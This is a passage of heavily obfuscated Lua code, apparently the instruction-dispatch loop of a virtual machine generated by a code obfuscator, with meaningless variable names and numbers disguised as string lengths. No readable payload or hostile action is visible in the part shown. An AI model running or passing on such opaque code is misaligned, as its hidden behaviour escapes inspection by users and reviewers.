if(btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ef")]]==btwbaby_IllIIIllIlIIIIIlIIIllII[#("5HNe")])then btwbaby_llIIllIll=btwbaby_llIIllIll+1;else btwbaby_llIIllIll=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ShU")];end;else local btwbaby_lIlIIllIllIlIIlI=btwbaby_IIlIIIlIllIllllIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("m3f")]];local btwbaby_IIlIllIIlIlIIlIIIl;local btwbaby_lIIlIlIIlIlIl={};btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_llIlIlllIlIlllIIlIlIl({},{__index=function(btwbaby_llIIllIll,btwbaby_IllIIIllIlIIIIIlIIIllII)local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_lIIlIlIIlIlIl[btwbaby_IllIIIllIlIIIIIlIIIllII];return btwbaby_IllIIIllIlIIIIIlIIIllII[1][btwbaby_IllIIIllIlIIIIIlIIIllII[2]];end,__newindex=function(btwbaby_llllIllI,btwbaby_IllIIIllIlIIIIIlIIIllII,btwbaby_llIIllIll)local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_lIIlIlIIlIlIl[btwbaby_IllIIIllIlIIIIIlIIIllII]btwbaby_IllIIIllIlIIIIIlIIIllII[1][btwbaby_IllIIIllIlIIIIIlIIIllII[2]]=btwbaby_llIIllIll;end;});for btwbaby_IllIIlllIIIIlIllIl=1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("DUaz")]do btwbaby_llIIllIll=btwbaby_llIIllIll+1;local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];if btwbaby_IllIIIllIlIIIIIlIIIllII[#("9")]==21 then btwbaby_lIIlIlIIlIlIl[btwbaby_IllIIlllIIIIlIllIl-1]={btwbaby_llllIllI,btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZEU")]};else btwbaby_lIIlIlIIlIlIl[btwbaby_IllIIlllIIIIlIllIl-1]={btwbaby_lllIllIIlIlIlIllIIIIIIIII,btwbaby_IllIIIllIlIIIIIlIIIllII[#("QGb")]};end;btwbaby_llIIIlIlllll[#btwbaby_llIIIlIlllll+1]=btwbaby_lIIlIlIIlIlIl;end;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("y8")]]=btwbaby_IIllIIIIlI(btwbaby_lIlIIllIllIlIIlI,btwbaby_IIlIllIIlIlIIlIIIl,btwbaby_IllIIlllIIIIlIllIl);end;elseif btwbaby_IIlIllIIlIlIIlIIIl==#("ktz7hRQUnmSX5XTEnXOWjf38hMvXcfbahfnBZscyJWoThLBnJAx7o4qf")then btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("KF")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("q3H")]];else local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Cl")]btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII](btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII+1])end;elseif btwbaby_IIlIllIIlIlIIlIIIl<=#("B0Fv3ShlSPZJsO4Vqnx1k0GkhnNTeVnZibzDHcPegIA5MPqVCl8Q3opKtunQe")then if btwbaby_IIlIllIIlIlIIlIIIl<=#("h6CaArpBnnJrUMBLJD61q2WH54VZjmY8aSBEELo9Ga7UhMFNjTVVUmhoj4f")then if btwbaby_IIlIllIIlIlIIlIIIl==#("GArbAKrbl7h8n6vp5bAtAhQABdnXLmtJFTEfT5uHtDCmLXHY11thEWfyU1")then btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("20")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("4p6")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Hq6T")]];else local btwbaby_IIlIllIIlIlIIlIIIl;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("fs")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("9ES")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{725;537;681;638};{75;741;255;334};"1 + 1 = 111";"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("kW")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("RLh")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("IMpz")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("M5")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("09Q")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("2Pl6")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("WD")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("mUJ")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("L0CG")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("FD")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("SjU")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1u")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZFU")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("avzi")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("0b")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("vQU")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("TH")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("4QH")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Fu")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("kyj")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ak")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("kG5")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("yX")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("xt0")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("sPkl")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("qu")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("0Q7")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("nj4s")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("0v")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("tBh")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("i2")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("FDH")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{128;820;71;597};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1M")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("TUn")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mf")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{418;251;331;998};{178;915;427;761};"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Cnj")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("7c")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("K05")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("5v")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("nGg")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("srof")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("YP")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Odh")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("2L")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Sn0")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("YJeD")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("vy")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("JW7")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("0n")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("1P9")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Da")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("r4y")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("yS")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("XRo")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("U2")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("Hj6")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("cs")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("F5H")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("RZBV")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("tY")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("xb0")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dA")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("NIs")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{362;657;777;142};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("gu")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("gcK")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Tc")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("pC6")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("aq")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("0F4")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("AF")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("hRS")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Zv")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZEi")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4T")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("rx8")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("2Cdn")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("2J")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("p8v")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Pl")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("YuX")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("TV30")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1W")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("LWs")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("7HIq")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("lI")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("gIx")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Shtm")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("js")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{549;296;818;774};"1 + 1 = 111";}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ULRA")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4U")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{592;538;134;776};"1 + 1 = 111";{767;56;628;660};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hT")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("s3Z")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("zSir")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("qx")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("zUu")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("2u")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("e6B")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Rm")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ggh")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("xz")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("RkT")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{310;964;263;695};"1 + 1 = 111";}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("z80")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1vyq")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("BB")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("gex")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("1nbu")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("H2")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("T7N")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("cPnV")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("uY")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{809;533;640;672};"1 + 1 = 111";}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("krjg")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ep")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("FOu")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ycfH")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("p5")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("BJP")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("9W")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hf8")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("rUNT")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("KM")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{64;830;718;532};"1 + 1 = 111";"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("3X")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("EFq")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("fk")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("dJc")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("zY")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("xda")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ri")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("syk")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("aMLo")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hE")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Kma")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Mjr5")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("TL")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{895;427;735;233};{203;617;915;331};{738;755;498;977};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("S5")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("sQj")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Fg8a")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ty")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{997;318;560;691};"1 + 1 = 111";"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 